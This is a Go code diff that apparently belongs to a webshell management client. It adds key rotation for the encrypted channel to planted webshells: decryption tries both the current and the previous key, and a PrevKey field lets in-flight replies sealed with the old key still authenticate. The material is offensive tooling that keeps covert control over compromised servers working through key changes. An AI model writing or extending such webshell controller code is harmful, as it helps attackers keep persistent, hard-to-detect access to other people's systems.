@@ -290,6 +290,41 @@ func sealShellToken(key []byte, mode ShellCryptoMode, plaintext []byte, now time
 // openShellToken reverses sealShellToken after authenticating the header. The
 // timestamp is checked after authentication so a forged clock cannot bypass it.
 func openShellToken(key []byte, mode ShellCryptoMode, token string, now time.Time) ([]byte, error) {
+	pt, _, err := openShellTokenWithKeys([][]byte{key}, mode, token, now)
+	return pt, err
+}
+
+// openShellTokenWithKeys tries each candidate key in order and returns the
+// plaintext together with the index that worked. This is the wire-level half of
+// key-rotation atomicity: a shell that just rotated still has in-flight requests
+// and replies sealed with the previous key, so a reader that only knows the new
+// key would treat them as auth failures. The caller decides which keys are still
+// eligible (during the transition window) — this function never guesses.
+// Timestamp/nonce authentication still happens per key via openShellTokenKey, so
+// trying a second key cannot bypass the replay or skew checks.
+func openShellTokenWithKeys(keys [][]byte, mode ShellCryptoMode, token string, now time.Time) ([]byte, int, error) {
+	var lastErr error
+	tried := 0
+	for i, key := range keys {
+		if len(key) != 32 {
+			continue
+		}
+		tried++
+		pt, err := openShellTokenKey(key, mode, token, now)
+		if err == nil {
+			return pt, i, nil
+		}
+		lastErr = err
+	}
+	if tried == 0 {
+		return nil, -1, errors.New("webshell 密钥必须是 32 字节")
+	}
+	return nil, -1, lastErr
+}
+
+// openShellTokenKey is the single-key decrypt core shared by openShellToken and
+// openShellTokenWithKeys.
+func openShellTokenKey(key []byte, mode ShellCryptoMode, token string, now time.Time) ([]byte, error) {
 	if len(key) != 32 {
 		return nil, errors.New("webshell 密钥必须是 32 字节")
 	}
@@ -645,6 +680,12 @@ func decodeShellResponse(p ShellPayload, body string) (string, error) {
 		return "", errors.New("加密 webshell 缺少密钥")
 	}
 	mode := ShellCryptoModeForType(p.Type)
+	// 过渡期内 New/Prev 两把密钥都能解响应：轮换瞬间在途的旧密钥回执不再被
+	// 当成认证失败；窗口结束后服务端清空 PrevKey，旧密钥自然失效。
+	keys := [][]byte{p.Key}
+	if len(p.PrevKey) == 32 {
+		keys = append(keys, p.PrevKey)
+	}
 	candidates := []string{strings.TrimSpace(body)}
 	seen := map[string]bool{}
 	for _, m := range shellResponseTokenPattern.FindAllString(body, -1) {
@@ -658,7 +699,7 @@ func decodeShellResponse(p ShellPayload, body string) (string, error) {
 		if c == "" {
 			continue
 		}
-		pt, err := openShellToken(p.Key, mode, c, time.Now())
+		pt, _, err := openShellTokenWithKeys(keys, mode, c, time.Now())
 		if err != nil {
 			lastErr = err
 			continue
@@ -797,6 +838,10 @@ func RotateShellKey(ctx context.Context, c *DeepClient, shellURL string, p Shell
 	}
 	rotated := p
 	rotated.Key = append([]byte{}, newKey...)
+	// 旋转过渡期：壳在切换密钥的瞬间可能仍用旧密钥封回执（写入旁路文件与
+	// 切换活动密钥之间有一小段窗口）。把旧密钥带上，让回执能被两把密钥中
+	// 任意一把解开；这不会放宽时间戳/nonce 校验，也不会让错误密钥蒙混过关。
+	rotated.PrevKey = append([]byte{}, p.Key...)
 	if _, err := decodeShellResponse(rotated, resp.Body); err != nil {
 		return fmt.Errorf("新密钥回执验证失败: %v", err)
 	}
